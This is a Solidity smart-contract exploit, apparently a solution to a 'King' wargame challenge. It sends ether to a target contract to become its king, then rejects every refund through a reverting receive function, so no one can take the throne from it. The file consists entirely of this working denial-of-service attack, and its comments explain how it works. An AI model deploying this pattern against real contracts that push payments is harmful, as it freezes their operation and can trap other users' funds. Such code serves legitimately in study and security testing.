// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title KingAttacker
 * @notice Exploits the King contract by becoming an immovable king
 * @dev The receive function reverts, preventing the King contract from sending ether back
 */
contract KingAttacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    /**
     * @notice Claims the throne by sending ether to the King contract
     * @dev Must send at least the current prize amount
     */
    function attack() external payable {
        // Forward all received ether to the King contract to claim the throne
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Failed to claim throne");
    }

    /**
     * @notice Reverts all incoming ether transfers
     * @dev This prevents the King contract from sending ether back when someone tries to claim the throne
     * This creates a permanent DoS on the King contract's receive function
     */
    receive() external payable {
        revert("I refuse ether!");
    }
}
